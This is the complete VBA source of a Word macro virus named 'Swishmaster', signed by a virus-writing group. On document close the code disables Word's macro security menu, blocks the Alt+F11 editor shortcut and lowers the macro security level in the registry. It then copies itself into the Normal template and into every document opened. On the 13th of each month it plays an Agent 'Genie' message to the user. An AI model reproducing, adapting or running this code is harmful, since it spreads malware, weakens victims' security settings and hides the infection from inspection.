   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   On Error Resume Next
   'Word2003.Swishmaster
   'code by Necronomikon[DCA]
   'special thx to SerialKiller ex-CodeBreakers for providing me m$office03
   CommandBars("Macro").Controls("Security...").Enabled = False
   KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Security", "Level") = 1&
   If GetAttr(ActiveDocument.FullName) = 1 Then
       SetAttr ActiveDocument.FullName, 0
       ActiveDocument.Reload
      End If
   Set ad = ActiveDocument.VBProject.VBComponents(1)
   Set nt = NormalTemplate.VBProject.VBComponents(1)
   If nt.Name <> "swishmaster" Then
       Set bla = nt.CodeModule
       Set bla1 = ad.CodeModule
       bla.DeleteLines 1, bla.CountOfLines
       bla.InsertLines 1, bla1.Lines(1, bla1.CountOfLines)
       nt.Name = "swishmaster"
   End If
   If ad.Name <> "swishmaster" Then
       Set bla2 = ad.CodeModule
       Set bla3 = nt.CodeModule
       bla2.DeleteLines 1, bla2.CountOfLines
       bla2.InsertLines 1, bla3.Lines(1, bla3.CountOfLines)
       ad.Name = "swishmaster"
   End If
   If nt.Name = "swishmaster" Then
       NormalTemplate.Save
       NormalTemplate.Saved = True
   End If
   checker = Left(ActiveDocument.Name, 8)
   If checker <> "Document" And IsNumeric(Right(ActiveDocument.Name, 1)) = False Then
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   Else
       ActiveDocument.Saved = True
   End If
   SetAttr ActiveDocument.FullName, 1
   If day(now) = 13 Then
   Application.Caption = "***Swishmaster***"
   Application.StatusBar = True
   StatusBar = "(c)Necronomikon[DarkCoderzAlliance]"
   Set dca = CreateObject("Agent.Control.1")
   dca.Connected = True
   If VBA.IsObject(dca) Then
   dca.Characters.Load "Genie", "Genie.acs"
   Set nec = dca.Characters("Genie")
   End If
   With nec
   .Top = 200
   .Left = 200
   .Show
   nec.Play "Greet"
   nec.Speak "Here are you, " & Word.Application.UserName & " my lost sheep..." & "\Vol=99"
   nec.Play "Read"
   nec.Play "GetAttention"
   nec.Speak "Listen to me!"
   nec.Play "Idle1_1"
   nec.Speak "The path to harmony leads over shining ground."
   nec.Play "Acknowledge"
   Do Until nec.hide.Status = 0
   DoEvents
   Loop
   dca.Characters.Unload "Genie"
   End With
   End If
   End Sub
